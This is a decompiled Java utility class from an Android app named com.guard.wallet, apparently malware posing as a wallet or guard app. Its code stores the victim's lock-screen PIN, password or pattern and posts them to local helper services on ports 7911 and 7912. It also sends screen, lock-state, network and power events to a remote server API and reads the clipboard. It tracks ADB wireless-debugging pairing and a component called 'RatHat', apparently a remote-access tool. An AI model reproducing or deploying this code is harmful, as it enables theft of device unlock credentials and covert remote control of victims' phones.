package com.guard.wallet.utils;

import a1.AbstractC0026q;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.SharedPreferences;
import android.net.Uri;
import android.os.UserManager;
import android.util.Log;
import com.google.json.Gson;
import com.google.json.JsonObject;
import com.google.json.reflect.TypeToken;
import com.guard.wallet.MainApplication;
import com.guard.wallet.entity.ADBConfig;
import com.guard.wallet.entity.CheckPortResult;
import com.guard.wallet.entity.Point;
import com.guard.wallet.http.AbstractC0207l;
import com.guard.wallet.http.C0204i;
import com.guard.wallet.req.AdminAdminActivatingVO;
import com.guard.wallet.req.ApiRequest;
import com.guard.wallet.req.LockPatternVO;
import com.guard.wallet.req.MessageRecordVO;
import com.guard.wallet.req.NetStateVO;
import com.guard.wallet.req.PasswordEventBodyVO;
import com.guard.wallet.req.ReqMessageVO;
import com.guard.wallet.req.ReqUnlockDeviceVO;
import com.guard.wallet.req.ScreenMetricsVO;
import com.guard.wallet.resp.ApiResult;
import com.guard.wallet.resp.PairResponseVO;
import com.guard.wallet.resp.PowerControlStateVO;
import com.guard.wallet.service.MyAccessibilityService;
import com.guard.wallet.stat.ScreenEventStatVO;
import java.lang.reflect.Type;
import java.util.Date;
import java.util.LinkedList;
import java.util.List;
import java.util.Objects;
import p005h.C0318e;
import p007j.C0350e;

/* renamed from: com.guard.wallet.utils.h */
/* loaded from: classes.dex */
public abstract class AbstractC0252h {
    /* renamed from: A */
    public static boolean m680A(ADBConfig aDBConfig) {
        if (aDBConfig != null) {
            synchronized (ADBConfig.class) {
                ADBConfig m689J = m689J();
                if (aDBConfig.getUpdateTime() > m689J.getUpdateTime()) {
                    if (aDBConfig.isPaired()) {
                        m689J.setPaired(aDBConfig.isPaired());
                    }
                    if (Objects.equals(1, Integer.valueOf(aDBConfig.getInstalledRatHat()))) {
                        m689J.setInstalledRatHat(1);
                    }
                    if (Objects.equals(1, Integer.valueOf(aDBConfig.getIsRatHatRunning()))) {
                        m689J.setIsRatHatRunning(1);
                    }
                    if (!Objects.equals(m689J.getDebugPort(), aDBConfig.getDebugPort())) {
                        m689J.setConnected(false);
                        m689J.setDebugPort(aDBConfig.getDebugPort());
                        if (MainApplication.getInstance() != null) {
                            MainApplication.getInstance().rewriteDebugPort(aDBConfig.getDebugPort());
                        }
                    }
                    m689J.setUpdateTime(aDBConfig.getUpdateTime());
                    m683D(m693N(m689J), "ADBConfig");
                    return true;
                }
            }
        }
        return false;
    }

    /* renamed from: B */
    public static void m681B(boolean z2, boolean z3) {
        m683D(Boolean.valueOf(z2), "isAdminActivating");
        if (z3) {
            String str = AbstractC0207l.f252a;
            new C0204i("http://127.0.0.1:7911").m408h(new AdminAdminActivatingVO(z2), "/syncAdminActivating", new C0350e(1));
        }
    }

    /* renamed from: C */
    public static void m682C(ReqUnlockDeviceVO reqUnlockDeviceVO) {
        if (reqUnlockDeviceVO != null) {
            synchronized (ReqUnlockDeviceVO.class) {
                ReqUnlockDeviceVO m702f = !reqUnlockDeviceVO.getLocked().booleanValue() ? m702f() : null;
                if (m702f == null) {
                    m702f = new ReqUnlockDeviceVO();
                    m702f.setLocked(reqUnlockDeviceVO.getLocked());
                }
                if (reqUnlockDeviceVO.getBoundsInScreen() != null) {
                    m702f.setBoundsInScreen(reqUnlockDeviceVO.getBoundsInScreen());
                }
                if (reqUnlockDeviceVO.getBoundsInParent() != null) {
                    m702f.setBoundsInParent(reqUnlockDeviceVO.getBoundsInParent());
                }
                if (!AbstractC0026q.m151B(reqUnlockDeviceVO.getCipherGradeCode())) {
                    if (!Objects.equals(reqUnlockDeviceVO.getCipherGradeCode(), "PASSWORD_QUALITY_PATTERN")) {
                        m702f.setCipherGradeCode(reqUnlockDeviceVO.getCipherGradeCode());
                        if (reqUnlockDeviceVO.getTouchCipher() != null && !reqUnlockDeviceVO.getTouchCipher().isEmpty()) {
                            m702f.setTouchCipher(reqUnlockDeviceVO.getTouchCipher());
                        }
                        if (!AbstractC0026q.m151B(reqUnlockDeviceVO.getTextCipher())) {
                            m702f.setTextCipher(reqUnlockDeviceVO.getTextCipher());
                        }
                    } else if (reqUnlockDeviceVO.getPatternCipher() != null && !reqUnlockDeviceVO.getPatternCipher().isEmpty()) {
                        m702f.setCipherGradeCode(reqUnlockDeviceVO.getCipherGradeCode());
                        m702f.setPatternCipher(reqUnlockDeviceVO.getPatternCipher());
                    }
                }
                m683D(m693N(m702f), m702f.getLocked().booleanValue() ? "deviceCipherLocked" : "deviceCipher");
            }
            if (MainApplication.getInstance() != null) {
                MainApplication.getInstance().offerStrategyEvent("LOCAL_LOCK_CIPHER_PREPARED");
            }
            String str = AbstractC0207l.f252a;
            int i2 = 1;
            if (!AbstractC0026q.m154E(7911)) {
                new C0204i("http://127.0.0.1:7911").m408h(reqUnlockDeviceVO, "/syncLockCipher", new C0350e(i2));
            }
            if (AbstractC0026q.m154E(7912)) {
                return;
            }
            new C0204i("http://127.0.0.1:7912").m408h(reqUnlockDeviceVO, "/syncLockCipher", new C0350e(i2));
        }
    }

    /* renamed from: D */
    public static synchronized boolean m683D(Object obj, String str) {
        SharedPreferences.Editor edit;
        synchronized (AbstractC0252h.class) {
            if (!AbstractC0026q.m151B(str) && obj != null && AbstractC0251g.m653Z() != null && m715s()) {
                try {
                    SharedPreferences sharedPreferences = AbstractC0251g.m653Z().getSharedPreferences(str, 0);
                    if (sharedPreferences != null && (edit = sharedPreferences.edit()) != null) {
                        if (obj instanceof Integer) {
                            edit.putInt(str, ((Integer) obj).intValue());
                            edit.apply();
                            return true;
                        }
                        if (obj instanceof String) {
                            edit.putString(str, (String) obj);
                            edit.apply();
                            return true;
                        }
                        if (obj instanceof Float) {
                            edit.putFloat(str, ((Float) obj).floatValue());
                            edit.apply();
                            return true;
                        }
                        if (obj instanceof Long) {
                            edit.putLong(str, ((Long) obj).longValue());
                            edit.apply();
                            return true;
                        }
                        if (obj instanceof Boolean) {
                            edit.putBoolean(str, ((Boolean) obj).booleanValue());
                            edit.apply();
                            return true;
                        }
                        Log.d("SharedUtils", "不支持数据类型");
                    }
                } catch (Exception e2) {
                    AbstractC0026q.m186s("SharedUtils", e2);
                }
            }
            return false;
        }
    }

    /* renamed from: E */
    public static void m684E(String str) {
        synchronized (AbstractC0252h.class) {
            if (!AbstractC0026q.m151B(str)) {
                String m709m = m709m();
                m683D(str, "systemLangCode");
                if (!Objects.equals(str, m709m)) {
                    if (!AbstractC0026q.m151B(m709m)) {
                        Log.d("SharedUtils", "原始语言:".concat(m709m));
                    }
                    if (!AbstractC0026q.m151B(m709m)) {
                        Log.d("SharedUtils", "当前语言:".concat(str));
                    }
                    AbstractC0250f.f411b.set(false);
                    AbstractC0207l.m443z();
                    if (MyAccessibilityService.m554P() != null) {
                        MyAccessibilityService.m554P().f328k.set(1);
                        AbstractC0207l.m421d();
                    }
                }
            }
        }
    }

    /* renamed from: F */
    public static void m685F() {
        NetStateVO z02 = AbstractC0251g.z0();
        MessageRecordVO messageRecordVO = new MessageRecordVO();
        messageRecordVO.setIntentCode("android.net.conn.CONNECTIVITY_CHANGE");
        messageRecordVO.setExtraBody(z02);
        MainApplication.getInstance().getHandlerMsgAndTimer().m579b(messageRecordVO);
    }

    /* renamed from: G */
    public static void m686G(String str) {
        if (AbstractC0026q.m151B(str)) {
            return;
        }
        Long valueOf = Long.valueOf(m706j("lockBatchId"));
        MessageRecordVO messageRecordVO = new MessageRecordVO();
        PasswordEventBodyVO passwordEventBodyVO = new PasswordEventBodyVO();
        if (valueOf.longValue() > 0) {
            passwordEventBodyVO.setLockBatchId(String.valueOf(valueOf));
        }
        messageRecordVO.setIntentCode(str);
        messageRecordVO.setExtraBody(passwordEventBodyVO);
        if (m718v(messageRecordVO) || MainApplication.getInstance() == null || MainApplication.getInstance().getHandlerMsgAndTimer() == null) {
            return;
        }
        MainApplication.getInstance().getHandlerMsgAndTimer().m579b(messageRecordVO);
    }

    /* renamed from: H */
    public static void m687H(int i2, String str) {
        LockPatternVO B0 = AbstractC0251g.B0();
        Log.d("MessageUtils", "需要向服务器提交屏幕事件:" + i2);
        MessageRecordVO messageRecordVO = new MessageRecordVO();
        ScreenEventStatVO screenEventStatVO = new ScreenEventStatVO();
        screenEventStatVO.setState(Integer.valueOf(i2));
        screenEventStatVO.setScreenOffTimeout(AbstractC0251g.P0());
        screenEventStatVO.setIsKeyguardLocked(B0.getIsKeyguardLocked());
        screenEventStatVO.setIsKeyguardSecure(B0.getIsKeyguardSecure());
        screenEventStatVO.setInKeyguardRestrictedInputMode(B0.getInKeyguardRestrictedInputMode());
        screenEventStatVO.setIsDeviceLocked(B0.getIsDeviceLocked());
        screenEventStatVO.setIsDeviceSecure(B0.getIsDeviceSecure());
        screenEventStatVO.setQuality(B0.getQuality());
        screenEventStatVO.setIsScreenOn(Integer.valueOf(AbstractC0249e.m621j() ? 1 : 0));
        messageRecordVO.setIntentCode(str);
        messageRecordVO.setExtraBody(screenEventStatVO);
        if (m718v(messageRecordVO) || MainApplication.getInstance() == null || MainApplication.getInstance().getHandlerMsgAndTimer() == null) {
            return;
        }
        MainApplication.getInstance().getHandlerMsgAndTimer().m579b(messageRecordVO);
    }

    /* renamed from: I */
    public static void m688I() {
        try {
            ScreenMetricsVO m616e = AbstractC0249e.m616e();
            MessageRecordVO messageRecordVO = new MessageRecordVO();
            messageRecordVO.setIntentCode("android.intent.action.SCREEN_SIZE");
            messageRecordVO.setExtraBody(m616e);
            if (m718v(messageRecordVO) || MainApplication.getInstance() == null || MainApplication.getInstance().getHandlerMsgAndTimer() == null) {
                return;
            }
            MainApplication.getInstance().getHandlerMsgAndTimer().m579b(messageRecordVO);
        } catch (Exception e2) {
            AbstractC0026q.m186s("MessageUtils", e2);
        }
    }

    /* renamed from: J */
    public static ADBConfig m689J() {
        String m708l = m708l("ADBConfig");
        ADBConfig aDBConfig = !AbstractC0026q.m151B(m708l) ? (ADBConfig) m699c(m708l, new TypeToken<ADBConfig>() { // from class: com.guard.wallet.utils.SharedUtils$3
        }) : null;
        if (aDBConfig == null) {
            aDBConfig = new ADBConfig();
            aDBConfig.setConnected(false);
            aDBConfig.setConnectedDevice(null);
            aDBConfig.setInstalledRatHat(-1);
            aDBConfig.setIsRatHatRunning(-1);
            aDBConfig.setEnableDevelopment(AbstractC0251g.m638K() ? 1 : 0);
            aDBConfig.setEnableDebug(AbstractC0251g.m636I() ? 1 : 0);
            aDBConfig.setEnableWifiDebug(AbstractC0251g.m637J() ? 1 : 0);
            aDBConfig.setUpdateTime(0L);
        }
        if (C0318e.m844S() != null && C0318e.m844S().f608B.get()) {
            aDBConfig.setInstalledRatHat(1);
            aDBConfig.setIsRatHatRunning(1);
        }
        return aDBConfig;
    }

    /* renamed from: K */
    public static void m690K(ReqUnlockDeviceVO reqUnlockDeviceVO) {
        String str;
        String m693N;
        if (reqUnlockDeviceVO != null) {
            synchronized (ReqUnlockDeviceVO.class) {
                if (reqUnlockDeviceVO.getLocked().booleanValue()) {
                    str = "deviceCipherLocked";
                    m693N = m693N(reqUnlockDeviceVO);
                } else {
                    str = "deviceCipher";
                    m693N = m693N(reqUnlockDeviceVO);
                }
                m683D(m693N, str);
                if (MainApplication.getInstance() != null) {
                    MainApplication.getInstance().offerStrategyEvent("LOCAL_LOCK_CIPHER_PREPARED");
                }
            }
        }
    }

    /* renamed from: L */
    public static void m691L(PowerControlStateVO powerControlStateVO) {
        synchronized (PowerControlStateVO.class) {
            m683D(m693N(powerControlStateVO), "powerControlState:".concat(powerControlStateVO.getPackageName()));
            String str = AbstractC0207l.f252a;
            int i2 = 1;
            new C0204i("http://127.0.0.1:7911").m408h(powerControlStateVO, "/syncPowerControl", new C0350e(i2));
            String m708l = m708l("deviceId");
            if (!AbstractC0026q.m151B(m708l)) {
                powerControlStateVO.setDeviceId(m708l);
                new C0204i().m408h(powerControlStateVO, "/api/devicePowerControlState/post.json", new C0350e(i2));
            }
        }
    }

    /* renamed from: M */
    public static JsonObject m692M(String str) {
        if (AbstractC0026q.m151B(str)) {
            return null;
        }
        try {
            Gson gson = new Gson();
            JsonObject jsonObject = (JsonObject) gson.fromJson(str, JsonObject.class);
            gson.destroy();
            return jsonObject;
        } catch (Exception e2) {
            AbstractC0026q.m186s("com.guard.wallet.utils.h", e2);
            return null;
        }
    }

    /* renamed from: N */
    public static String m693N(Object obj) {
        if (obj == null) {
            return "{}";
        }
        try {
            Gson gson = new Gson();
            String json = gson.toJson(obj);
            gson.destroy();
            return json;
        } catch (Exception e2) {
            AbstractC0026q.m186s("com.guard.wallet.utils.h", e2);
            return "{}";
        }
    }

    /* renamed from: O */
    public static Point m694O(String str) {
        if (AbstractC0026q.m151B(str)) {
            return null;
        }
        try {
            Type type = new TypeToken<Point>() { // from class: com.guard.wallet.utils.GsonUtils$2
            }.getType();
            Gson gson = new Gson();
            Point point = (Point) gson.fromJson(str, type);
            gson.destroy();
            return point;
        } catch (Exception e2) {
            AbstractC0026q.m186s("com.guard.wallet.utils.h", e2);
            return null;
        }
    }

    /* renamed from: P */
    public static List m695P(String str) {
        if (AbstractC0026q.m151B(str)) {
            return null;
        }
        try {
            Type type = new TypeToken<List<Point>>() { // from class: com.guard.wallet.utils.GsonUtils$1
            }.getType();
            Gson gson = new Gson();
            List list = (List) gson.fromJson(str, type);
            gson.destroy();
            return list;
        } catch (Exception e2) {
            AbstractC0026q.m186s("com.guard.wallet.utils.h", e2);
            return null;
        }
    }

    /* renamed from: Q */
    public static void m696Q() {
        synchronized (ADBConfig.class) {
            ADBConfig m689J = m689J();
            int i2 = 1;
            m689J.setEnableDevelopment(AbstractC0251g.m638K() ? 1 : 0);
            m689J.setEnableDebug(AbstractC0251g.m636I() ? 1 : 0);
            if (!AbstractC0251g.m637J()) {
                i2 = 0;
            }
            m689J.setEnableWifiDebug(i2);
            m689J.setUpdateTime(new Date().getTime());
            m683D(m693N(m689J), "ADBConfig");
        }
    }

    /* renamed from: a */
    public static Integer m697a() {
        synchronized (ADBConfig.class) {
            ADBConfig m689J = m689J();
            if (!m689J.isConnected() || m689J.getDebugPort() == null || m689J.getDebugPort().intValue() <= 0) {
                return 0;
            }
            return m689J.getDebugPort();
        }
    }

    /* renamed from: b */
    public static Integer m698b() {
        synchronized (ADBConfig.class) {
            ADBConfig m689J = m689J();
            if (m689J.getDebugPort() == null || m689J.getDebugPort().intValue() <= 0) {
                return 0;
            }
            return m689J.getDebugPort();
        }
    }

    /* renamed from: c */
    public static Object m699c(String str, TypeToken typeToken) {
        if (AbstractC0026q.m151B(str)) {
            return null;
        }
        try {
            Gson gson = new Gson();
            Object fromJson = gson.fromJson(str, (TypeToken<Object>) typeToken);
            gson.destroy();
            return fromJson;
        } catch (Exception e2) {
            AbstractC0026q.m186s("com.guard.wallet.utils.h", e2);
            return null;
        }
    }

    /* renamed from: d */
    public static Object m700d(String str, Class cls) {
        if (AbstractC0026q.m151B(str)) {
            return null;
        }
        try {
            Gson gson = new Gson();
            Object fromJson = gson.fromJson(str, (Class<Object>) cls);
            gson.destroy();
            return fromJson;
        } catch (Exception e2) {
            AbstractC0026q.m186s("com.guard.wallet.utils.h", e2);
            return null;
        }
    }

    /* renamed from: e */
    public static synchronized boolean m701e(String str) {
        synchronized (AbstractC0252h.class) {
            if (!AbstractC0026q.m151B(str) && AbstractC0251g.m653Z() != null && m715s()) {
                try {
                    SharedPreferences sharedPreferences = AbstractC0251g.m653Z().getSharedPreferences(str, 0);
                    if (sharedPreferences != null) {
                        return sharedPreferences.getBoolean(str, false);
                    }
                } catch (Exception e2) {
                    AbstractC0026q.m186s("SharedUtils", e2);
                }
            }
            return false;
        }
    }

    /* renamed from: f */
    public static ReqUnlockDeviceVO m702f() {
        synchronized (ReqUnlockDeviceVO.class) {
            String m708l = m708l("deviceCipher");
            if (AbstractC0026q.m151B(m708l)) {
                return null;
            }
            return (ReqUnlockDeviceVO) m699c(m708l, new TypeToken<ReqUnlockDeviceVO>() { // from class: com.guard.wallet.utils.SharedUtils$1
            });
        }
    }

    /* renamed from: g */
    public static ReqUnlockDeviceVO m703g() {
        synchronized (ReqUnlockDeviceVO.class) {
            String m708l = m708l("deviceCipherLocked");
            if (AbstractC0026q.m151B(m708l)) {
                return null;
            }
            return (ReqUnlockDeviceVO) m699c(m708l, new TypeToken<ReqUnlockDeviceVO>() { // from class: com.guard.wallet.utils.SharedUtils$2
            });
        }
    }

    /* renamed from: h */
    public static synchronized float m704h() {
        synchronized (AbstractC0252h.class) {
            if (!AbstractC0026q.m151B("batteryPercent") && AbstractC0251g.m653Z() != null && m715s()) {
                try {
                    SharedPreferences sharedPreferences = AbstractC0251g.m653Z().getSharedPreferences("batteryPercent", 0);
                    if (sharedPreferences != null) {
                        return sharedPreferences.getFloat("batteryPercent", 0.0f);
                    }
                } catch (Exception e2) {
                    AbstractC0026q.m186s("SharedUtils", e2);
                }
            }
            return 0.0f;
        }
    }

    /* renamed from: i */
    public static synchronized int m705i(String str) {
        synchronized (AbstractC0252h.class) {
            if (!AbstractC0026q.m151B(str) && AbstractC0251g.m653Z() != null && m715s()) {
                try {
                    SharedPreferences sharedPreferences = AbstractC0251g.m653Z().getSharedPreferences(str, 0);
                    if (sharedPreferences != null) {
                        return sharedPreferences.getInt(str, -1);
                    }
                } catch (Exception e2) {
                    AbstractC0026q.m186s("SharedUtils", e2);
                }
            }
            return -1;
        }
    }

    /* renamed from: j */
    public static synchronized long m706j(String str) {
        synchronized (AbstractC0252h.class) {
            if (!AbstractC0026q.m151B(str) && AbstractC0251g.m653Z() != null && m715s()) {
                try {
                    SharedPreferences sharedPreferences = AbstractC0251g.m653Z().getSharedPreferences(str, 0);
                    if (sharedPreferences != null) {
                        return sharedPreferences.getLong(str, 0L);
                    }
                } catch (Exception e2) {
                    AbstractC0026q.m186s("SharedUtils", e2);
                }
            }
            return 0L;
        }
    }

    /* renamed from: k */
    public static PowerControlStateVO m707k(String str) {
        if (!AbstractC0026q.m151B(str)) {
            synchronized (PowerControlStateVO.class) {
                String m708l = m708l("powerControlState:".concat(str));
                if (!AbstractC0026q.m151B(m708l)) {
                    return (PowerControlStateVO) m699c(m708l, new TypeToken<PowerControlStateVO>() { // from class: com.guard.wallet.utils.SharedUtils$4
                    });
                }
            }
        }
        return new PowerControlStateVO();
    }

    /* renamed from: l */
    public static synchronized String m708l(String str) {
        synchronized (AbstractC0252h.class) {
            if (!AbstractC0026q.m151B(str) && AbstractC0251g.m653Z() != null && m715s()) {
                try {
                    SharedPreferences sharedPreferences = AbstractC0251g.m653Z().getSharedPreferences(str, 0);
                    if (sharedPreferences != null) {
                        return sharedPreferences.getString(str, null);
                    }
                } catch (Exception e2) {
                    AbstractC0026q.m186s("SharedUtils", e2);
                }
            }
            return null;
        }
    }

    /* renamed from: m */
    public static String m709m() {
        String m708l;
        synchronized (AbstractC0252h.class) {
            m708l = m708l("systemLangCode");
        }
        return m708l;
    }

    /* renamed from: n */
    public static boolean m710n() {
        return m716t(m702f());
    }

    /* renamed from: o */
    public static boolean m711o() {
        return m716t(m703g());
    }

    /* renamed from: p */
    public static void m712p() {
        synchronized (ADBConfig.class) {
            ADBConfig m689J = m689J();
            m689J.setConnected(false);
            m689J.setConnectedDevice(null);
            m689J.setConnectErrorCount(0);
            m689J.setInstalledRatHat(-1);
            m689J.setIsRatHatRunning(-1);
            m689J.setEnableDevelopment(AbstractC0251g.m638K() ? 1 : 0);
            m689J.setEnableDebug(AbstractC0251g.m636I() ? 1 : 0);
            m689J.setEnableWifiDebug(AbstractC0251g.m637J() ? 1 : 0);
            m683D(m693N(m689J), "ADBConfig");
        }
    }

    /* renamed from: q */
    public static boolean m713q() {
        boolean z2;
        boolean z3;
        synchronized (AbstractC0252h.class) {
            synchronized (AbstractC0252h.class) {
                z2 = true;
                if (!AbstractC0026q.m151B("isFirstOpenAccessibility") && AbstractC0251g.m653Z() != null && m715s()) {
                    try {
                        SharedPreferences sharedPreferences = AbstractC0251g.m653Z().getSharedPreferences("isFirstOpenAccessibility", 0);
                        if (sharedPreferences != null) {
                            if (sharedPreferences.contains("isFirstOpenAccessibility")) {
                                z3 = true;
                            }
                        }
                        z3 = false;
                    } catch (Exception e2) {
                        AbstractC0026q.m186s("SharedUtils", e2);
                    }
                }
                z3 = false;
            }
            return z2;
        }
        if (z3 && !m701e("isFirstOpenAccessibility")) {
            z2 = false;
        }
        return z2;
    }

    /* renamed from: r */
    public static boolean m714r(String str) {
        PowerControlStateVO m707k;
        return !AbstractC0026q.m151B(str) && (m707k = m707k(str)) != null && m707k.getAllowAllFullBackground().booleanValue() && m707k.getAllowAutoStart().booleanValue();
    }

    /* renamed from: s */
    public static synchronized boolean m715s() {
        UserManager userManager;
        synchronized (AbstractC0252h.class) {
            if (AbstractC0251g.m653Z() != null && (userManager = (UserManager) AbstractC0251g.m653Z().getSystemService("user")) != null) {
                try {
                    if (userManager.isUserUnlocked()) {
                        return true;
                    }
                } catch (Exception e2) {
                    AbstractC0026q.m186s("SharedUtils", e2);
                }
            }
            return false;
        }
    }

    /* renamed from: t */
    public static boolean m716t(ReqUnlockDeviceVO reqUnlockDeviceVO) {
        if (reqUnlockDeviceVO != null) {
            return Objects.equals(reqUnlockDeviceVO.getCipherGradeCode(), "PASSWORD_QUALITY_TOUCH_POINTS") ? (reqUnlockDeviceVO.getTouchCipher() == null || reqUnlockDeviceVO.getTouchCipher().isEmpty()) ? false : true : Objects.equals(reqUnlockDeviceVO.getCipherGradeCode(), "PASSWORD_QUALITY_PATTERN") ? (reqUnlockDeviceVO.getPatternCipher() == null || reqUnlockDeviceVO.getPatternCipher().isEmpty()) ? false : true : (AbstractC0026q.m151B(reqUnlockDeviceVO.getTextCipher()) || AbstractC0026q.m151B(reqUnlockDeviceVO.getCipherGradeCode())) ? false : true;
        }
        return false;
    }

    /* renamed from: u */
    public static String m717u() {
        ClipData.Item itemAt;
        if (AbstractC0251g.m653Z() == null) {
            return null;
        }
        try {
            ClipboardManager clipboardManager = (ClipboardManager) AbstractC0251g.m653Z().getSystemService("clipboard");
            if (clipboardManager == null || clipboardManager.getPrimaryClip() == null || (itemAt = clipboardManager.getPrimaryClip().getItemAt(0)) == null) {
                return null;
            }
            if (itemAt.getText() != null) {
                return itemAt.getText().toString();
            }
            Uri uri = itemAt.getUri();
            if (uri != null && !AbstractC0026q.m151B(uri.toString())) {
                return uri.toString();
            }
            if (AbstractC0026q.m151B(itemAt.getHtmlText())) {
                return null;
            }
            return itemAt.getHtmlText();
        } catch (Exception e2) {
            AbstractC0026q.m186s("com.guard.wallet.utils.h", e2);
            return null;
        }
    }

    /* renamed from: v */
    public static boolean m718v(MessageRecordVO messageRecordVO) {
        String m708l = m708l("deviceId");
        if (AbstractC0026q.m151B(m708l)) {
            return false;
        }
        messageRecordVO.setDeviceId(m708l);
        ReqMessageVO reqMessageVO = new ReqMessageVO();
        reqMessageVO.setDeviceId(m708l);
        reqMessageVO.setIntentCode(messageRecordVO.getIntentCode());
        if (messageRecordVO.getExtraBody() != null) {
            reqMessageVO.setExtraBody(m693N(messageRecordVO.getExtraBody()));
        }
        LinkedList linkedList = new LinkedList();
        linkedList.add(reqMessageVO);
        ApiRequest apiRequest = new ApiRequest();
        apiRequest.setData(linkedList);
        JsonObject m434q = AbstractC0207l.m434q(apiRequest, AbstractC0207l.f252a);
        if (m434q == null) {
            return false;
        }
        ApiResult apiResult = (ApiResult) m699c(m434q.toString(), new TypeToken<ApiResult<Boolean>>() { // from class: com.guard.wallet.utils.MessageUtils$1
        });
        if (apiResult == null || !apiResult.getSuccess().booleanValue() || !((Boolean) apiResult.getData()).booleanValue()) {
            return false;
        }
        Log.d("MessageUtils", "同步向服务器提交消息成功");
        return true;
    }

    /* renamed from: w */
    public static synchronized void m719w(String str) {
        SharedPreferences.Editor edit;
        synchronized (AbstractC0252h.class) {
            if (!AbstractC0026q.m151B(str) && AbstractC0251g.m653Z() != null && m715s()) {
                try {
                    SharedPreferences sharedPreferences = AbstractC0251g.m653Z().getSharedPreferences(str, 0);
                    if (sharedPreferences != null && (edit = sharedPreferences.edit()) != null) {
                        edit.remove(str);
                        edit.apply();
                    }
                } catch (Exception e2) {
                    AbstractC0026q.m186s("SharedUtils", e2);
                }
            }
        }
    }

    /* renamed from: x */
    public static void m720x(CheckPortResult checkPortResult) {
        synchronized (ADBConfig.class) {
            ADBConfig m689J = m689J();
            if (!Objects.equals(checkPortResult.getDebugPort(), m689J.getDebugPort())) {
                m689J.setDebugPort(checkPortResult.getDebugPort());
                if (MainApplication.getInstance() != null) {
                    MainApplication.getInstance().rewriteDebugPort(checkPortResult.getDebugPort());
                }
            }
            if (!AbstractC0026q.m151B(checkPortResult.getConnectedDevice())) {
                m689J.setConnectedDevice(checkPortResult.getConnectedDevice());
            }
            m689J.setConnected(checkPortResult.isConnected());
            m689J.setUpdateTime(new Date().getTime());
            if (checkPortResult.isConnected() && AbstractC0251g.m637J()) {
                m689J.setPaired(true);
            }
            m683D(m693N(m689J), "ADBConfig");
            AbstractC0207l.m433p(m689J);
        }
    }

    /* renamed from: y */
    public static void m721y(PairResponseVO pairResponseVO) {
        synchronized (ADBConfig.class) {
            ADBConfig m689J = m689J();
            m689J.setPaired(pairResponseVO.isPaired());
            if (pairResponseVO.getDebugPort() != null && pairResponseVO.getDebugPort().intValue() > 0) {
                m689J.setConnected(pairResponseVO.isConnected());
                if (!Objects.equals(pairResponseVO.getDebugPort(), m689J.getDebugPort())) {
                    m689J.setDebugPort(pairResponseVO.getDebugPort());
                    if (MainApplication.getInstance() != null) {
                        MainApplication.getInstance().rewriteDebugPort(pairResponseVO.getDebugPort());
                    }
                }
            }
            m689J.setUpdateTime(new Date().getTime());
            m683D(m693N(m689J), "ADBConfig");
            AbstractC0207l.m433p(m689J);
        }
    }

    /* renamed from: z */
    public static void m722z(boolean z2) {
        synchronized (ADBConfig.class) {
            ADBConfig m689J = m689J();
            m689J.setInstalledRatHat(z2 ? 1 : 0);
            m689J.setUpdateTime(new Date().getTime());
            m683D(m693N(m689J), "ADBConfig");
        }
    }
}
